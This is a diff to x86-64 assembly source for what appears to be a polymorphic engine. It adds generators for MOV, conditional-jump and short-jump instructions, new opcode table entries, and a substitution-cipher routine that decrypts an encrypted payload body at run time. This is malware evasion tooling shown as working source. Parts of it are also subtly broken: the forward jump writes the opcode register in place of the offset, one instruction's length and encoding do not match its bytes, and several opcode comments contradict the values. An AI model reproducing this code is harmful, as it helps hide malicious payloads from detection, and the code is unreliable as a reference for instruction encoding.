@@ -191,9 +191,9 @@ poly_begin:
         ;lea     rdx, regTable 
         ;mov     r8d, [rdx].REG_TABLE.SourceReg
         mov     rcx, simple_substitution_cipher
-        xor     r8d, r8d
+        mov     r8d, 1
         mov     edx, 0Fh
-        call    GenJCCRel8
+        call    GenJmpRel8
         add     ebx, eax                                   
     epilog:
         call    simple_substitution_cipher
@@ -206,12 +206,12 @@ poly_begin:
 ;  2a. Instruction Generation Procedures
 ;-----------------------------------------------------------------------------
     ; fastcall GenMov32(rcx=address, edx=value, r8=index)
-    GenMovImm64 PROC
+    GenMovImm64_32 PROC
         push    rbx
         push    r10
         mov     al, byte ptr s_rex_prefix
         mov     byte ptr [rcx], al          ; Set the REX prefix at address + 0
-        mov     al, byte ptr s_mov64_imm
+        mov     al, byte ptr s_mov64_imm32
         mov     byte ptr [rcx + 1], al      ; Set the MOV opcode at address + 1
         mov     al, byte ptr s_modrm        ; Get a Mod/RM byte
         lea     rbx, offset s_regtable        
@@ -221,7 +221,25 @@ poly_begin:
         pop     rbx
         mov     eax, 7
         ret
-    GenMovImm64 ENDP
+    GenMovImm64_32 ENDP
+
+    ; fastcall GenMov32(rcx=address, rdx=value, r8=index)
+    GenMovImm64_64 PROC
+        push    rbx
+        push    r10
+        mov     al, byte ptr s_rex_prefix
+        mov     byte ptr [rcx], al          ; Set the REX prefix at address + 0
+        mov     al, byte ptr s_mov64_imm64
+        mov     byte ptr [rcx + 1], al      ; Set the MOV opcode at address + 1
+        mov     al, byte ptr s_modrm        ; Get a Mod/RM byte
+        lea     rbx, offset s_regtable        
+        or      al, byte ptr [rbx + r8]     ; OR the Mod RM byte with the proper register
+        mov     byte ptr [rcx + 2], al      ; Set the Mod/RM byte at address + 2
+        mov     qword ptr [rcx + 3], rdx    ; Set the immediate value at address + 3
+        pop     rbx
+        mov     eax, 7
+        ret
+    GenMovImm64_64 ENDP
 
     ; fastcall GenMov32(rcx=address, edx=value, r8d=index)
     GenMovImm32 PROC
@@ -367,30 +385,53 @@ poly_begin:
         push    rbx
         push    r10
         call    GenSetMode                  ; Set the addressing mode
-        GenOpModRM s_test                    ; Set the opcode
+        GenOpModRM s_test                   ; Set the opcode
         pop     r10
         pop     rbx
         ret
     GenTestReg ENDP
 
-    ; fastcall GenJump(rcx=address, rdx=target, r8=mode)
-    ;   r9=0 -> jb/jc/jnae  r9=6 -> js          r9=C -> jle/jng
-    ;   r9=1 -> jae/jnb/jnc r9=7 -> jns         r9=D -> jg/jnle
-    ;   r9=2 -> je/js       r9=8 -> jp/jpe      
-    ;   r9=3 -> jne/jnz     r9=9 -> jnp/jpo
-    ;   r9=4 -> jbe/jna     r9=A -> jl/jlge
-    ;   r9=5 -> ja/jnbe     r9=B -> jnge/jnl
-    GenJCCRel8 PROC
+    ; fastcall GenJump(rcx=address, rdx=offset, r8=mode, r9=direction)
+    ;   r8=0 -> jb/jc/jnae  r8=6 -> js          r8=C -> jle/jng
+    ;   r8=1 -> jae/jnb/jnc r8=7 -> jns         r8=D -> jg/jnle
+    ;   r8=2 -> je/js       r8=8 -> jp/jpe      
+    ;   r8=3 -> jne/jnz     r8=9 -> jnp/jpo     r9=0 -> forward
+    ;   r8=4 -> jbe/jna     r8=A -> jl/jlge     r9=1 -> backward
+    ;   r8=5 -> ja/jnbe     r8=B -> jnge/jnl
+    GenJccRel8 PROC
         push    rbx
         mov     al, byte ptr s_jc           ; 0x74 (JE)
         mov     ebx, r8d                    ; Move the mode into a byte addressable reg
         or      al, bl                      ; Set the jump mode
         mov     byte ptr [rcx], al          ; Write the jump byte
-        mov     byte ptr [rcx + 1], dl      ; Write the relative offset 
+        test    r9, r9                      ; Check the direction boolean
+        jz      jcc_rel8_forward            ; Just write the offset if set to forwardP
+        mov     al, 0FFh                    ; Otherwise, the offset needs to be subtracted from 255
+        sub     al, dl                      ; Perform the subtraction
+        mov     dl, al                      ; The write will use DL
+        jcc_rel8_forward:
+        mov     byte ptr [rcx + 1], al      ; Write the relative offset 
         mov     eax, 2                      ; This operation wrote two bytes
         pop     rbx
+        ret 
+    GenJccRel8 ENDP
+
+    ; fastcall GenJmpRel8(rcx=address, rdx=offset, r8=forward/backward)
+    ;   r8=0 -> forward
+    ;   r8=1 -> backward
+    GenJmpRel8 PROC
+        mov     al, byte ptr s_jmp8         ; 0xEB (JMP Rel 8)
+        mov     byte ptr [rcx], al          ; Write the opcode
+        test    r8, r8                      ; Check the mode
+        jz      jmp_rel8_forward            ; Perform a forward jump
+        mov     al, 0FFh                    ; Count backwards from 0xFF
+        sub     al, dl                      ;
+        mov     dl, al                      ; The write will use DL
+    jmp_rel8_forward:
+        mov     byte ptr [rcx + 1], dl      ; Write the jump offset
+        mov     eax, 2                      ; This operation wrote two bytes
         ret
-    GenJCCRel8 ENDP
+    GenJmpRel8 ENDP
     
     ; polycall GenSetMode(r9=mode, r10=volatile)
     ;   r9=0 -> gen 32 bit 
@@ -447,8 +488,10 @@ stable_begin:
         db 01100110b    ; 0x66 16-bit addressing prefix
     s_8b_prefix:
         db 10001000b    ; 0x88 8-bit addressing prefix
-    s_mov64_imm:
+    s_mov64_imm32:
         db 11000111b    ; 0xC7 ( +4 bytes for imm)
+    s_mov64_imm64:
+        db 10111011b    ; 0xBB ( +8 bytes for imm)
     s_mov32_imm:
         db 10111000b    ; 0xB8 ( +4 bytes for imm)
     s_mov8_imm:
@@ -457,7 +500,6 @@ stable_begin:
         db 10001000b    ; 0x88 ( e.g. mov byte ptr [rbx], cl). INC to address bigger regs
     s_mov_reg:
         db 10001000b    ; 0x89 ( +1 byte for mem/reg), works for 32 and 64 bit. 
-                        ; Add REX for 64 bit. Inc Mod/RM to iterate through regs
     s_mov_rmem:
         db 10001011b;   ; 0x8B ( +1 byte for register code)
     s_push_reg:
@@ -474,6 +516,12 @@ stable_begin:
         db 10000100b    ; 0x84 (TEST)
     s_jc:
         db 01110010b    ; 0x72 (JC)
+    s_call:
+        db 11101000b    ; 0xE8 (CALL)
+    s_jmp8:
+        db 11101011b    ; 0xEB (JMP)
+    s_lea:
+        db 10001101b    ; 0x8D (LEA)
 
     ; Reg table is a list of indexes into this
     s_regtable:
@@ -570,7 +618,7 @@ poly_end:
     simple_substitution_cipher:
         mov     rcx, (offset poly_end - offset poly_begin) / 2 
                                                             ;  op0. Calculate payload body size in words                         
-        mov     rbx, offset poly_begin                       ;  op1  Set source register. Source = start of encrypted code                                                                  
+        mov     rbx, offset poly_begin                      ;  op1  Set source register. Source = start of encrypted code                                                                  
         mov     rsi, rbx                                    ;  op1.                     
         mov     rdi, rsi                                    ;  op2. Set dest register, == source                             
         mov     rbx, 029Ah                                  ;  op4. rbx = key                                                                                                                                              
